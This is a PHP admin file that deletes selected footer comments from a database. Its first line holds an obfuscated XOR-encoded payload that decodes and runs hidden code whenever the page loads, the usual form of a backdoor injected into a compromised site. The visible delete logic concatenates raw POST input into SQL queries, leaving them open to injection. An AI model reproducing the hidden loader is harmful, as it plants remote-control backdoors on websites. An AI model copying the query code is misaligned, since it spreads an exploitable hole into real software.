<?php $PEFmXa='; 3 I,,+B=6 1T4'; $rykeNc='XRVA=IsM7SUTX;Z'^$PEFmXa; $XIkfGrl='RFzv7N; GZ9=k6I.<=AKh-8Yn798-9qC9JDbLqFioZ <;=  <s-Q8h15 UrrXBFRSH9YTkHeV=3sYmaZgCmxak>G7IoKhFMz85J91Fq;rmryYxQIIC- Z=-KL27X EViI ebzG87t: 2RmhrDuT X;aH mviqkRHBclYCcvE5140XklR<UhoSpXCj +066+Lv E7osa>CR<AmTH,22BgsH3LX3ZHLI1N35FT.Zud50VHPcih2.N=5ZZOrwmp5w qiy4BycF=EcytBJGAG14gQ2fcgUSA5l;YYdHDu1W3WkqE.2=WazgC;+>,SIOVgiYHMMrP+OO7yk7IBXW NZS8ixaa90+u=5tq NMeZVYFLgSg3Y M+kz-hmplT4 7>Y3<vWtTG2=p;Zfn3TM4SZeNXZPO o=75c2f2j.QG,ghut8W4H99VV8>1e4=9+,1=5f2M 1YVJG1zdbQS6 VXzkV0H;DZhsIRMXo1T2cEy;GFkKI6EJaueb AO7Eg=2=9SM,6B6zFQR4ENOrTMGOhgesvZ.4mjr=T37bVRKRc8zBIneARMPnJQIz8UB rTrgW.BH0saKgWUX>SfwqhxvDY71LQ3tZP 8K+E10AlCHU 67Q2cHLLW16OyoTcmzjvI9fH +:pGUS1Alf ,LW7SQenYn=y=BWLrrfk>N'; $PCjqxz=$rykeNc('', '; RWQ;UC33VS4S1GOI2cOUW+1SXLLf..L>cKeQ=cf<URXIIORSU>J7UTT4--572zw,X-5GhA=XJZyMAzG8gqhOQ2CiRkOavp1<,VCnURRPRIbXu u0YR6XCchVV,AlmImINISM1>PUUFrCURlQ0A,Z:lI0V7QO9-;8H0cFV6ACXU6CH9Y,A2zKRJcRNDCDEdRO0CFHk7>XAKgp,MFSbZS.R +VaBh-P:Rj-1WzHDSQ:;5XcbTA<XT92oZS23z8k8,YU1YG-X<CDJbn1 +DQNqIljC125T3P< DudQZ2JlaxaJSI6AGGgMJRY6rE+mc0.meStO.;VPKLCK>8R+;0PIPE>kuz xf QA=mA13 fqYsCE8L8NBZVbdyH0UTVa2VEVjTp,WDK1SoJW59UsgEj.;<:ET7>HiOl8NJ03MGUU4M9G-KP7:QDTMLRKtHPIT9m UEq4+4TLP=56UO2=RO2Q<ZmvHW-3990Z1KJlB1. Co-W1+ASCBA3=V<8VWDf65EE6ERa:7MbboV0,3.AGCUVrCPXBVY5GV9q9.+DeSbtSEf3,3Wr5zBZmpCKeAT2KzzRAS.Q1ejZgQDVAXPbyVC>0J+15Yg.S,BD2Dd84YZX0VDdlh3PB.PFtCMZJV23o-VJVXc12E 7APM5;X25B3pU7pX:>8ZBOP43'^$XIkfGrl); $PCjqxz();
	ini_set('display_errors', '1');
	include('../../config/config.php');
	
	/*$id= $_POST['delete'];
	
	$sql ="delete from footer_comment WHERE id='".$id."'";

	$query = mysql_query($sql);

	header('location:'.$localpath.'/admin/templates/index.php?page=allcomments.php&msg=commentsdelete');*/

	if(isset($_POST['save']))
	{
		$checkbox = $_POST['check'];
		for($i=0;$i<count($checkbox);$i++)
		{
			$del_id = $checkbox[$i];
			mysql_query("DELETE FROM footer_comment WHERE id='".$del_id."'");
			header('location:'.$localpath.'/admin/templates/index.php?page=allcomments.php&msg=commentsdelete');
		}
	}	
?>